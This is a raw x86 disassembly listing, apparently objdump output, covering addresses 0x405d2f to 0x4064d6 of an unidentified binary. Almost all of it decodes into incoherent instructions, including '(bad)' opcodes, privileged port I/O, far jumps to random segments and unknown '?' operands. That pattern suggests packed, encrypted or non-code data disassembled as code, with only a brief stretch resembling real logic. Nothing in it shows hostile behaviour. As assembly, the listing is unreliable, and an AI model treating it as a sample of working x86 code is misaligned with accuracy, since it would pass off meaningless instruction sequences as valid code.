  405d2f:	test   eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	into   
  405d37:	and    eax,0x40ac287b
  405d3c:	jge    0x405d10
  405d3e:	adc    al,0xc7
  405d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d41:	test   BYTE PTR [ebp+0x12],dl
  405d44:	retf   0x685c
  405d47:	imul   ebx,DWORD PTR [esi-0x17],0x312be048
  405d4e:	add    DWORD PTR [ecx-0x2a],ebp
  405d51:	jns    0x405d13
  405d53:	pop    ds
  405d54:	xchg   edx,eax
  405d55:	test   eax,0xf5db0d29
  405d5a:	outs   dx,BYTE PTR ds:[esi]
  405d5b:	push   cs
  405d5c:	mov    bh,0x63
  405d5e:	adc    ebp,edi
  405d60:	sbb    ecx,ebp
  405d62:	hlt    
  405d63:	sub    eax,0xe1997f3c
  405d68:	mov    al,ds:0x8fc88133
  405d6d:	nop
  405d6e:	les    ebp,FWORD PTR [esi-0x6f]
  405d71:	dec    edx
  405d72:	jns    0x405d44
  405d74:	xor    al,0x89
  405d76:	mov    ecx,DWORD PTR ds:0x405c4dc0
  405d7c:	inc    eax
  405d7d:	xor    al,BYTE PTR [esi+0x3]
  405d80:	xchg   DWORD PTR [edx],esi
  405d82:	pop    eax
  405d83:	inc    ecx
  405d84:	and    eax,0x1ca4352b
  405d89:	adc    BYTE PTR [esi-0x413cbbae],al
  405d8f:	cdq    
  405d90:	daa    
  405d91:	imul   ecx,DWORD PTR [edi-0x7d2b61c1],0xbff867fe
  405d9b:	add    DWORD PTR [ecx-0x59a87666],esp
  405da1:	xchg   edx,eax
  405da2:	inc    ebp
  405da3:	in     al,dx
  405da4:	in     al,0x1c
  405da6:	or     DWORD PTR [esi+0x64],edi
  405da9:	ficomp DWORD PTR [ecx-0x1e42a9d6]
  405daf:	clc    
  405db0:	bound  ebx,QWORD PTR [ecx]
  405db2:	rcr    DWORD PTR [esi+eax*8],cl
  405db5:	jbe    0x405da4
  405db7:	sbb    DWORD PTR gs:[eax-0x55],0xafbddaa2
  405dbf:	cmp    dh,BYTE PTR [esi-0x12]
  405dc2:	mov    ds:0xe37d481,eax
  405dc7:	xchg   ebp,eax
  405dc8:	sbb    dl,BYTE PTR [edi-0x4714a5c3]
  405dce:	pusha  
  405dcf:	pop    ds
  405dd0:	popa   
  405dd1:	ret    0xfb5b
  405dd4:	mov    ah,0xaf
  405dd6:	adc    eax,eax
  405dd8:	fstp   TBYTE PTR [ebx]
  405dda:	cs jns 0x405d66
  405ddd:	add    al,0xa1
  405ddf:	pop    ecx
  405de0:	pop    ebp
  405de1:	inc    ecx
  405de2:	scas   al,BYTE PTR es:[edi]
  405de3:	mov    esp,0xc121115
  405de9:	dec    ecx
  405dea:	dec    ebx
  405deb:	int    0x74
  405ded:	add    ch,BYTE PTR [edx-0x21]
  405df0:	sar    DWORD PTR [edx+0x670ee194],1
  405df6:	shl    bl,cl
  405df8:	sbb    BYTE PTR [edx],bh
  405dfa:	je     0x405e66
  405dfc:	mov    esp,0xd47e8103
  405e01:	(bad)  
  405e02:	out    dx,eax
  405e03:	test   DWORD PTR [edx-0x6b6a34d2],0x5ca78ed7
  405e0d:	pop    ss
  405e0e:	pop    edx
  405e0f:	lea    eax,[eax-0x72]
  405e12:	push   esi
  405e13:	sti    
  405e14:	mov    ecx,0x25bf5140
  405e19:	test   ebp,esi
  405e1b:	aaa    
  405e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e1d:	mov    ecx,0xba09567d
  405e22:	stc    
  405e23:	inc    ebp
  405e24:	nop    edx
  405e27:	sub    eax,0x4d151a84
  405e2c:	xlat   BYTE PTR ds:[ebx]
  405e2d:	xor    eax,0xeb243f2a
  405e32:	jb     0x405e12
  405e34:	jo     0x405e87
  405e36:	xor    ah,BYTE PTR [ebx]
  405e38:	inc    ecx
  405e39:	xlat   BYTE PTR ds:[ebx]
  405e3a:	js     0x405eaa
  405e3c:	lods   al,BYTE PTR ds:[esi]
  405e3d:	pop    ss
  405e3e:	adc    esp,DWORD PTR ds:0x2c031223
  405e44:	dec    edx
  405e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e46:	mov    dh,0x37
  405e48:	xlat   BYTE PTR ds:[ebx]
  405e49:	jbe    0x405e97
  405e4b:	adc    esi,0x591c6a6e
  405e51:	push   cs
  405e52:	xchg   esp,eax
  405e53:	pusha  
  405e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e56:	mov    ds:0x348373b4,al
  405e5b:	out    dx,eax
  405e5c:	and    al,0x5b
  405e5e:	pop    edx
  405e5f:	js     0x405ed8
  405e61:	dec    edi
  405e62:	jbe    0x405e87
  405e64:	mov    ch,0x84
  405e66:	mov    esp,0x58da4b9c
  405e6b:	dec    edi
  405e6c:	sar    DWORD PTR [edx+0x10f81e6e],0xac
  405e73:	xor    eax,0x8400838a
  405e78:	mov    WORD PTR [edx],?
  405e7a:	cmp    DWORD PTR [ecx-0x39655879],edx
  405e80:	xlat   BYTE PTR ds:[ebx]
  405e81:	(bad)  
  405e82:	xchg   esi,eax
  405e83:	mov    eax,0x9d07ebe5
  405e88:	mov    al,ds:0xb0e26117
  405e8d:	cli    
  405e8e:	out    dx,al
  405e8f:	das    
  405e90:	fist   WORD PTR [edx+0x6d]
  405e93:	mov    eax,ds:0xd9d3b249
  405e98:	mov    ebx,0xeb109c28
  405e9d:	xchg   ebx,eax
  405e9e:	(bad)  
  405e9f:	mov    eax,ds:0xf74ea481
  405ea4:	mov    ds:0x684b7114,al
  405ea9:	ins    BYTE PTR es:[edi],dx
  405eaa:	mov    edi,0x9ae6cb66
  405eaf:	loope  0x405f27
  405eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb2:	jne    0x405ef4
  405eb4:	pop    ss
  405eb5:	dec    ebp
  405eb6:	pop    edx
  405eb7:	test   eax,0x8fd058b8
  405ebc:	in     eax,dx
  405ebd:	shl    BYTE PTR [edi-0x5c6645f8],1
  405ec3:	bound  esp,QWORD PTR [edx+0xe5be1a3]
  405ec9:	pop    esi
  405eca:	stos   BYTE PTR es:[edi],al
  405ecb:	repz pop ecx
  405ecd:	imul   eax,ebp,0xf2b82bcc
  405ed3:	mov    ecx,0x206ce86
  405ed8:	sbb    bh,BYTE PTR [eax]
  405eda:	int3   
  405edb:	arpl   WORD PTR [edx+0x123c2f87],sp
  405ee1:	add    esi,ecx
  405ee3:	int    0x2f
  405ee5:	retf   
  405ee6:	adc    al,0xaf
  405ee8:	hlt    
  405ee9:	xor    dh,BYTE PTR [ecx]
  405eeb:	iret   
  405eec:	mov    ebx,ecx
  405eee:	xor    DWORD PTR [edi],ecx
  405ef0:	or     dl,dl
  405ef2:	cli    
  405ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ef4:	dec    ecx
  405ef5:	dec    edi
  405ef6:	sub    DWORD PTR [ebx+ebp*2+0x3a],ebp
  405efa:	mov    edi,DWORD PTR [edi+0x3c]
  405efd:	pop    ds
  405efe:	cmp    eax,DWORD PTR [edx-0x47]
  405f01:	stos   BYTE PTR es:[edi],al
  405f02:	std    
  405f03:	dec    ecx
  405f04:	jo     0x405e94
  405f06:	retf   0x3ecc
  405f09:	inc    esi
  405f0a:	dec    esi
  405f0b:	shl    BYTE PTR [ebp-0x6],cl
  405f0e:	retf   0x3813
  405f11:	ss sbb eax,edx
  405f14:	and    eax,0xc64b9b91
  405f19:	xchg   edx,eax
  405f1a:	ret    
  405f1b:	mov    ebx,0x8cf5476b
  405f20:	mov    ds:0xcc7f1103,eax
  405f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f26:	cmp    BYTE PTR [eax-0x7],bl
  405f29:	push   ebp
  405f2a:	mov    BYTE PTR [eax-0x27],dh
  405f2d:	or     esp,DWORD PTR [eax+0x7]
  405f30:	mov    ah,dl
  405f32:	lods   eax,DWORD PTR ds:[esi]
  405f33:	inc    ecx
  405f34:	hlt    
  405f35:	inc    DWORD PTR [edi-0x6f39d9dc]
  405f3b:	sar    eax,cl
  405f3d:	jae    0x405f27
  405f3f:	into   
  405f40:	shr    BYTE PTR [edi],cl
  405f42:	xchg   ecx,eax
  405f43:	mov    DWORD PTR [ecx-0x61],ebp
  405f46:	and    DWORD PTR [ebx],ebx
  405f48:	bound  esi,QWORD PTR [esi+ebx*1-0x5c]
  405f4c:	push   esi
  405f4d:	idiv   DWORD PTR [ebx]
  405f4f:	jbe    0x405ee8
  405f51:	ss and eax,0xed944e38
  405f57:	and    al,0x4e
  405f59:	xchg   ecx,eax
  405f5a:	mov    ?,WORD PTR cs:[ebp+0x2b4d1587]
  405f61:	push   es
  405f62:	add    BYTE PTR [esi],al
  405f64:	(bad)  
  405f65:	jmp    0x405f39
  405f67:	xadd   ebp,esi
  405f6a:	and    BYTE PTR [ecx+0x54],dh
  405f6d:	push   esi
  405f6e:	in     eax,0x55
  405f70:	jmp    0x49cc643e
  405f75:	cmp    ebp,DWORD PTR [ebp-0x76]
  405f78:	repz mov edx,0x223e29ae
  405f7e:	jle    0x405f92
  405f80:	jbe    0x405ffb
  405f82:	pop    ds
  405f83:	and    ah,0xad
  405f86:	mov    esi,0xef11eee0
  405f8b:	cmp    DWORD PTR [ebp-0x79],esi
  405f8e:	fnsave [esi-0x7c72939]
  405f94:	or     BYTE PTR [eax-0x25],al
  405f97:	fdivr  DWORD PTR [eax-0x23]
  405f9a:	fsub   QWORD PTR [edi-0x7d]
  405f9d:	cwde   
  405f9e:	push   esi
  405f9f:	inc    edi
  405fa0:	dec    edx
  405fa1:	xor    BYTE PTR [esi],al
  405fa3:	pop    ss
  405fa4:	pop    edx
  405fa5:	or     al,0x2e
  405fa7:	out    dx,al
  405fa8:	xlat   BYTE PTR ds:[ebx]
  405fa9:	out    dx,al
  405faa:	stc    
  405fab:	jne    0x405f58
  405fad:	or     al,0x6e
  405faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb0:	stos   BYTE PTR es:[edi],al
  405fb1:	fdivr  DWORD PTR ds:0xdcf83d5b
  405fb7:	loopne 0x405fe6
  405fb9:	lods   eax,DWORD PTR ds:[esi]
  405fba:	ss sub eax,0xbe21c8d2
  405fc0:	data16 loop 0x40602b
  405fc3:	fstp   st(2)
  405fc5:	leave  
  405fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fc7:	push   ss
  405fc8:	push   cs
  405fc9:	cmp    ch,BYTE PTR [ebx+esi*2]
  405fcc:	stos   DWORD PTR es:[edi],eax
  405fcd:	pop    eax
  405fce:	inc    ebp
  405fcf:	call   DWORD PTR [ebx-0x6c]
  405fd2:	test   eax,0xa16441c2
  405fd7:	daa    
  405fd8:	frstor ds:0x81132dc5
  405fde:	mov    bh,0xd7
  405fe0:	sar    edx,0x1b
  405fe3:	addr16 clc 
  405fe5:	stc    
  405fe6:	out    dx,al
  405fe7:	lock mov cl,0xa5
  405fea:	jle    0x406021
  405fec:	adc    DWORD PTR [ecx+0x75],ebp
  405fef:	mov    bh,0x42
  405ff1:	lea    edi,[esi]
  405ff3:	repz inc esi
  405ff5:	add    eax,0x7589cc4c
  405ffa:	push   0x5c
  405ffc:	dec    eax
  405ffd:	jmp    0x405fab
  405fff:	inc    edi
  406000:	es test al,0x42
  406003:	mov    edi,0xb5d11135
  406008:	in     al,0x1c
  40600a:	outs   dx,DWORD PTR ds:[esi]
  40600b:	hlt    
  40600c:	test   BYTE PTR [esi-0x6],ch
  40600f:	mov    bh,BYTE PTR [ecx+0x3a]
  406012:	repz sti 
  406014:	xor    al,0xbe
  406016:	jnp    0x406049
  406018:	scas   al,BYTE PTR es:[edi]
  406019:	lods   eax,DWORD PTR ds:[esi]
  40601a:	mov    eax,0xd3a28ff4
  40601f:	xor    al,0xdc
  406021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406022:	mov    esi,0xe81f0189
  406027:	(bad)  
  406028:	sti    
  406029:	add    al,0xe2
  40602b:	mov    es,WORD PTR [edx+0x48]
  40602e:	mov    edx,0xf9814e87
  406033:	int    0xf7
  406035:	test   BYTE PTR [esi],dh
  406037:	xlat   BYTE PTR ds:[ebx]
  406038:	div    BYTE PTR [esi-0x4c95f86e]
  40603e:	add    eax,0x61574afc
  406043:	cmp    bl,bh
  406045:	daa    
  406046:	fist   DWORD PTR [esp+esi*2-0x73]
  40604a:	adc    ch,bh
  40604c:	je     0x40603a
  40604e:	retf   0xb99c
  406051:	retf   
  406052:	outs   dx,DWORD PTR ds:[esi]
  406053:	pop    ss
  406054:	jne    0x40607f
  406056:	aam    0xdb
  406058:	xchg   edi,eax
  406059:	imul   esp,DWORD PTR gs:[eax+ebx*8+0x55cf5b3e],0xffffffee
  406062:	lahf   
  406063:	adc    eax,0xe3a8987d
  406068:	clc    
  406069:	inc    ebx
  40606a:	jge    0x40609f
  40606c:	sbb    DWORD PTR [edi],ebp
  40606e:	mov    dl,0x4f
  406070:	loop   0x406092
  406072:	dec    edx
  406073:	(bad)  
  406075:	lock and al,0xb1
  406078:	jecxz  0x4060d0
  40607a:	daa    
  40607b:	xchg   edx,eax
  40607c:	into   
  40607d:	cld    
  40607e:	dec    esi
  40607f:	lahf   
  406080:	lahf   
  406081:	pop    eax
  406082:	xor    ecx,esi
  406084:	xchg   DWORD PTR [esi],edx
  406086:	repz cld 
  406088:	ja     0x40604b
  40608a:	xchg   ebp,eax
  40608b:	push   ds
  40608c:	setl   BYTE PTR [edi+0x794c4f8f]
  406093:	sub    bh,dl
  406095:	ss out dx,eax
  406097:	mov    esi,0x2eaf85cd
  40609c:	pop    eax
  40609d:	xor    eax,0x779c85fa
  4060a2:	scas   al,BYTE PTR es:[edi]
  4060a3:	or     DWORD PTR [esi],ecx
  4060a5:	cs adc al,0x4b
  4060a8:	xchg   ecx,eax
  4060a9:	jl     0x4060ee
  4060ab:	clc    
  4060ac:	aas    
  4060ad:	pop    ebp
  4060ae:	std    
  4060af:	out    0x35,al
  4060b1:	fldenv [ebp+0x2628e3d1]
  4060b7:	cld    
  4060b8:	repz (bad) 
  4060ba:	mov    edi,0x69ad4a3b
  4060bf:	pop    ecx
  4060c0:	outs   dx,DWORD PTR ds:[esi]
  4060c1:	cmp    eax,0xc58a5238
  4060c6:	inc    ebx
  4060c7:	call   0x6bc3fe40
  4060cc:	popa   
  4060cd:	and    BYTE PTR [ebp-0x30],cl
  4060d0:	sbb    ch,BYTE PTR [edx+eiz*2-0x5c643bd6]
  4060d7:	sub    ch,BYTE PTR [ecx+0x36]
  4060da:	arpl   WORD PTR [edi+edi*8-0x7a],ax
  4060de:	xchg   ecx,eax
  4060df:	mov    eax,0xe340d205
  4060e4:	cmc    
  4060e5:	cmp    BYTE PTR [eax-0x4d],al
  4060e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060e9:	push   edx
  4060ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060eb:	xchg   esi,eax
  4060ec:	sbb    eax,0xc3e0e8f7
  4060f1:	in     eax,0x40
  4060f3:	jbe    0x406172
  4060f5:	cmp    eax,0x5448d51
  4060fa:	cld    
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	pop    eax
  40612d:	inc    edx
  40612e:	mov    edi,0x18a378b0
  406133:	sbb    BYTE PTR [esi-0x3ee7e7ee],bl
  406139:	mov    bh,0xb6
  40613b:	xor    DWORD PTR [eax+edi*8],ecx
  40613e:	xlat   BYTE PTR ds:[ebx]
  40613f:	imul   edi,DWORD PTR [edi+0x1dd9e5c1],0x5c
  406146:	xor    al,0xc3
  406148:	add    al,dl
  40614a:	and    DWORD PTR [edi+0x79e45960],edx
  406150:	retf   0x8326
  406153:	cmp    al,0x8a
  406155:	inc    esp
  406156:	pop    es
  406157:	fistp  WORD PTR [ebx+edi*2]
  40615a:	adc    al,0x73
  40615c:	sub    dh,cl
  40615e:	loopne 0x4061b6
  406160:	fmulp  st(0),st
  406162:	xor    BYTE PTR [esi],al
  406164:	push   esp
  406165:	push   ecx
  406166:	(bad)  
  406167:	jge    0x40611b
  406169:	mov    cl,0x8c
  40616b:	mov    dh,0xaf
  40616d:	jno    0xe6062fa4
  406173:	lea    edx,[esp+eax*2-0x69ed550c]
  40617a:	add    al,0x96
  40617c:	push   cs
  40617d:	ins    BYTE PTR es:[edi],dx
  40617e:	hlt    
  40617f:	jno    0x4061bf
  406181:	dec    esp
  406182:	mov    al,ds:0x21ee1b45
  406187:	shl    BYTE PTR [ebx-0x53ccf13a],1
  40618d:	xor    bh,BYTE PTR [ecx-0x9]
  406190:	jmp    0x1aae:0xcaa64fee
  406197:	or     DWORD PTR [ecx+0x1a53e181],esi
  40619d:	arpl   WORD PTR [ecx+0x60],cx
  4061a0:	adc    ebp,DWORD PTR [esi]
  4061a2:	(bad)  
  4061a3:	aad    0xf6
  4061a5:	xchg   ebp,eax
  4061a6:	sar    dh,cl
  4061a8:	add    eax,0xca714974
  4061ad:	sub    eax,0x9ce243e7
  4061b2:	lea    ebx,[ebp+0x16]
  4061b5:	je     0x40620d
  4061b7:	or     al,0x50
  4061b9:	rcr    BYTE PTR [edi-0x477d57df],1
  4061bf:	mov    edx,0xb043d54d
  4061c4:	(bad)  
  4061c6:	inc    ebx
  4061c7:	add    eax,ebp
  4061c9:	inc    ebx
  4061ca:	mov    ds:0x66a60176,eax
  4061cf:	mov    ds:0x1e5bf466,eax
  4061d4:	rcr    DWORD PTR [edx+edi*2-0x76],1
  4061d8:	repnz sbb ecx,DWORD PTR [esi+0x45b8f1b0]
  4061df:	in     eax,dx
  4061e0:	int3   
  4061e1:	pop    ebp
  4061e2:	mov    BYTE PTR [esi-0x22],dl
  4061e5:	and    bl,BYTE PTR [edx+0x29b28faa]
  4061eb:	adc    dl,BYTE PTR [ebp+0x43]
  4061ee:	rcl    DWORD PTR [esi+eax*4+0x3c1fda15],cl
  4061f5:	push   eax
  4061f6:	xchg   esi,eax
  4061f7:	shr    BYTE PTR [esi-0x2d],0x9f
  4061fb:	(bad)  
  4061fc:	loopne 0x40623a
  4061fe:	ds jg  0x406251
  406201:	lods   eax,DWORD PTR ds:[esi]
  406202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406203:	push   edx
  406204:	aad    0x8f
  406206:	or     eax,ebp
  406208:	retfw  0x1205
  40620c:	cmp    al,BYTE PTR [eax]
  40620e:	int3   
  40620f:	mov    BYTE PTR [ecx+ebx*4],cl
  406212:	stos   DWORD PTR es:[edi],eax
  406213:	cld    
  406214:	gs ret 
  406216:	(bad)  
  406217:	cmp    bh,BYTE PTR [esi-0x24b6fab8]
  40621d:	adc    ebx,ebp
  40621f:	fdiv   QWORD PTR [ebx-0x7ea58307]
  406225:	pop    eax
  406226:	cs addr16 jo 0x7e80b87a
  40622e:	or     esp,0x53cd5e1d
  406234:	shr    ch,0x37
  406237:	xor    eax,0xf3fef075
  40623c:	ins    BYTE PTR es:[edi],dx
  40623d:	scas   eax,DWORD PTR es:[edi]
  40623e:	or     BYTE PTR [edi-0x7],ch
  406241:	sbb    ebp,DWORD PTR [ecx]
  406243:	push   ss
  406244:	and    edi,eax
  406246:	push   cs
  406247:	cmp    BYTE PTR [ecx-0x48],bl
  40624a:	pop    edx
  40624b:	adc    DWORD PTR [ebx+0xe],0x985baeaf
  406252:	mov    ds,WORD PTR [ebp+eiz*2-0x7a]
  406256:	adc    eax,0x54337fd6
  40625b:	sub    eax,0x85c31c6e
  406260:	xor    bh,BYTE PTR es:[edi+0x4aabae2a]
  406267:	pop    ebx
  406268:	push   eax
  406269:	add    ch,BYTE PTR [edi-0x4f]
  40626c:	scas   al,BYTE PTR es:[edi]
  40626d:	dec    ebp
  40626e:	inc    edi
  40626f:	imul   ecx,edx,0x2f4a024b
  406275:	ror    BYTE PTR [ecx],1
  406277:	xchg   ebx,eax
  406278:	add    BYTE PTR ds:0xb1f5691a,0xfd
  40627f:	(bad)  
  406280:	shl    ebx,1
  406282:	or     eax,0xa8d4c9da
  406287:	push   ebp
  406288:	lea    edi,[eax+0x22]
  40628b:	shl    DWORD PTR [ebx],cl
  40628d:	dec    esi
  40628e:	bound  ebp,QWORD PTR [esi+0x23f54943]
  406294:	jecxz  0x4062cb
  406296:	gs imul esi,edx,0xb754ca8d
  40629d:	jge    0x406263
  40629f:	dec    eax
  4062a0:	add    edi,DWORD PTR [ebx+esi*8]
  4062a3:	std    
  4062a4:	scas   eax,DWORD PTR es:[edi]
  4062a5:	jnp    0x40628d
  4062a7:	popf   
  4062a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062a9:	call   0xb263:0x57705d1b
  4062b0:	mov    dl,0x5d
  4062b2:	popf   
  4062b3:	mov    esp,0x5650cb4a
  4062b8:	icebp  
  4062b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ba:	loope  0x406276
  4062bc:	mov    bl,0x8
  4062be:	ins    DWORD PTR es:[edi],dx
  4062bf:	mov    bl,0xab
  4062c1:	xchg   esi,eax
  4062c2:	daa    
  4062c3:	fisubr DWORD PTR [eax-0x48]
  4062c6:	repnz xlat BYTE PTR ds:[ebx]
  4062c8:	aaa    
  4062c9:	lods   al,BYTE PTR ds:[esi]
  4062ca:	jns    0x40630d
  4062cc:	mov    ah,0xba
  4062ce:	cdq    
  4062cf:	jecxz  0x40632a
  4062d1:	or     BYTE PTR [eax+0x65bd6327],dl
  4062d7:	mov    al,BYTE PTR [esi-0x6f6af73c]
  4062dd:	rcl    BYTE PTR [esi-0x7e],0xae
  4062e1:	(bad)  
  4062e2:	fcmovne st,st(6)
  4062e4:	mov    BYTE PTR [esi+0x4b],al
  4062e7:	mov    DWORD PTR [eax-0x26502f88],esi
  4062ed:	out    0x18,al
  4062ef:	jmp    0x4062d7
  4062f1:	push   0x1c548663
  4062f6:	aam    0xb8
  4062f8:	dec    ebx
  4062f9:	mov    ah,0xd8
  4062fb:	push   0xa967010d
  406300:	mov    esi,DWORD PTR [ecx+0x65]
  406303:	js     0x40634c
  406305:	(bad)  
  406307:	jmp    0x4062e5
  406309:	xor    esp,DWORD PTR [eax]
  40630b:	inc    esp
  40630c:	push   edx
  40630d:	xchg   esp,eax
  40630e:	in     al,dx
  40630f:	lods   al,BYTE PTR ds:[esi]
  406310:	jmp    0x9417240
  406315:	add    al,0xd4
  406317:	or     DWORD PTR [edi-0x7],eax
  40631a:	sbb    ebx,DWORD PTR [edi-0x36d3a5f8]
  406320:	sbb    BYTE PTR [esi-0x14808cc5],dh
  406326:	sti    
  406327:	popa   
  406328:	xor    BYTE PTR ds:0xc5cd10f,0xa0
  40632f:	ja     0x406338
  406331:	or     DWORD PTR [esi],edi
  406333:	push   ebx
  406334:	jmp    0xa61e:0x77dfad76
  40633b:	je     0x406354
  40633d:	push   ss
  40633e:	pop    ecx
  40633f:	fnstenv cs:[esp+edi*2-0x13]
  406344:	sub    ebp,DWORD PTR [ebp-0x41]
  406347:	inc    edx
  406348:	leave  
  406349:	out    0x70,eax
  40634b:	rcl    DWORD PTR [ebx],1
  40634d:	push   ecx
  40634e:	imul   ecx,eax,0x5e
  406351:	push   0x1f
  406353:	mov    BYTE PTR [ebx],cl
  406355:	and    DWORD PTR [edi+0xf30751d],ebp
  40635b:	iret   
  40635c:	push   ebp
  40635d:	dec    esp
  40635e:	shr    BYTE PTR [edi+0x4a0e62a4],cl
  406364:	mov    al,0x6f
  406366:	fbstp  TBYTE PTR [esp+ebp*4]
  406369:	mov    dh,0x95
  40636b:	dec    edi
  40636c:	cmp    al,0x64
  40636e:	dec    ebx
  40636f:	sub    DWORD PTR [edi+0x33f8a479],esi
  406375:	add    eax,0x4de745e0
  40637a:	shl    cl,cl
  40637c:	or     cl,dh
  40637e:	dec    ebp
  40637f:	pop    ecx
  406380:	push   ss
  406381:	call   0xad873112
  406386:	stc    
  406387:	cwde   
  406388:	mov    al,ds:0xe6708df
  40638d:	pop    ss
  40638e:	mov    esp,0x78dae665
  406393:	gs popa 
  406395:	test   eax,eax
  406397:	fstp   TBYTE PTR [edi+0x20]
  40639a:	outs   dx,BYTE PTR ds:[esi]
  40639b:	inc    DWORD PTR [edx+0x30]
  40639e:	push   edx
  40639f:	adc    DWORD PTR [eax+ecx*8+0x25],0xffffffa6
  4063a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063a5:	sbb    eax,0x10c48cf8
  4063aa:	test   al,0x58
  4063ac:	lds    edx,FWORD PTR [esi]
  4063ae:	xor    esi,DWORD PTR [esi]
  4063b0:	aaa    
  4063b1:	mov    al,ds:0xd871c0d2
  4063b6:	mov    ?,esp
  4063b8:	push   esi
  4063b9:	jne    0x406397
  4063bb:	or     BYTE PTR [eax-0x11],bh
  4063be:	xchg   ebx,eax
  4063bf:	cmp    eax,0x2b4ff322
  4063c4:	jno    0x4063ff
  4063c6:	inc    ebp
  4063c7:	mov    edi,DWORD PTR [ebp-0x752ddc54]
  4063cd:	aaa    
  4063ce:	xchg   edx,eax
  4063cf:	dec    edx
  4063d0:	push   eax
  4063d1:	nop
  4063d2:	pop    esp
  4063d3:	sbb    BYTE PTR [eax+0x5e31a21a],0xf
  4063da:	sub    ecx,DWORD PTR [ebp-0x2f]
  4063dd:	pusha  
  4063de:	mov    ebx,0xdcacd2d7
  4063e3:	mov    dh,BYTE PTR [edi+0x7d04cf2c]
  4063e9:	jns    0x4063bc
  4063eb:	aas    
  4063ec:	mov    esp,0x8373b3e5
  4063f1:	or     DWORD PTR [esi],0xd1ad65e6
  4063f7:	xor    bh,BYTE PTR [esi+eax*2+0x7a]
  4063fb:	fstp   QWORD PTR [ebp-0x58935b5e]
  406401:	xchg   BYTE PTR [edi-0x13cd5050],cl
  406407:	xchg   ebx,eax
  406408:	pop    es
  406409:	xlat   BYTE PTR ds:[ebx]
  40640a:	fwait
  40640b:	iret   
  40640c:	sbb    eax,DWORD PTR [esi]
  40640e:	pop    esp
  40640f:	mov    DWORD PTR [ebx+0x49],esi
  406412:	push   ecx
  406413:	cmp    DWORD PTR [ecx-0x5],ebx
  406416:	lods   al,BYTE PTR ds:[esi]
  406417:	out    dx,al
  406418:	xchg   esp,eax
  406419:	adc    BYTE PTR [ecx+ecx*4],dh
  40641c:	xchg   ecx,eax
  40641d:	inc    ecx
  40641e:	mov    dh,0xf4
  406420:	retf   
  406421:	mov    ds:0x6936e93f,eax
  406426:	mov    esi,0x3b925a15
  40642b:	and    bl,BYTE PTR [edx]
  40642d:	xchg   esp,eax
  40642e:	iret   
  40642f:	jmp    0xa8d2:0x2afec811
  406436:	pop    ss
  406437:	sub    ah,BYTE PTR [ebx-0x243c1cd9]
  40643d:	iret   
  40643e:	gs mov ecx,0x3770a8cc
  406444:	push   esp
  406445:	or     edx,DWORD PTR [edi+eax*4]
  406448:	push   edi
  406449:	popa   
  40644a:	sub    BYTE PTR [edx+0x48ca9d29],ah
  406450:	(bad)
  406453:	inc    si
  406455:	push   cs
  406456:	lods   al,BYTE PTR ds:[esi]
  406457:	lahf   
  406458:	ds je  0x406482
  40645b:	push   es
  40645c:	das    
  40645d:	pop    ds
  40645e:	daa    
  40645f:	in     al,0x9e
  406461:	mov    ds:0x9507c82e,eax
  406466:	pop    es
  406467:	aad    0x52
  406469:	fsubr  DWORD PTR [eax-0x60]
  40646c:	shr    BYTE PTR [ebp+0x4a2a0c4],1
  406472:	mov    cl,0x79
  406474:	inc    ebp
  406475:	shr    DWORD PTR ds:[eax+eax*4+0x3c863193],cl
  40647d:	sti    
  40647e:	repnz jmp FWORD PTR [edx-0x1342225c]
  406485:	dec    edi
  406486:	pushf  
  406487:	icebp  
  406488:	fmul   st,st(7)
  40648a:	xor    BYTE PTR [ebx+0x2e0baab],ch
  406490:	mov    esp,0xd7c7cc2b
  406495:	sub    al,0xaf
  406497:	mov    ecx,0x9887a343
  40649c:	add    esp,ebx
  40649e:	das    
  40649f:	xchg   edx,eax
  4064a0:	icebp  
  4064a1:	mov    dl,0x91
  4064a3:	push   ss
  4064a4:	pushf  
  4064a5:	mov    ebp,DWORD PTR [ebx+0x4fafc21b]
  4064ab:	test   al,0xf2
  4064ad:	in     eax,0xfd
  4064af:	push   esi
  4064b0:	xor    edx,eax
  4064b2:	add    BYTE PTR [ecx],ch
  4064b4:	js     0x4064c0
  4064b6:	adc    eax,0x3d04db26
  4064bb:	pop    esp
  4064bc:	cmp    BYTE PTR [ebx+0x4f],ah
  4064bf:	dec    ebx
  4064c0:	std    
  4064c1:	sbb    eax,0x5b1ba90c
  4064c6:	data16 xor al,0x3
  4064c9:	sbb    DWORD PTR [edi+edi*4],eax
  4064cc:	and    al,0xb
  4064ce:	jl     0x406537
  4064d0:	(bad)  
  4064d2:	ins    BYTE PTR es:[edi],dx
  4064d3:	pop    edx
  4064d4:	arpl   WORD PTR [ecx],dx
  4064d6:	mov    edx,0xc0c2c7f1
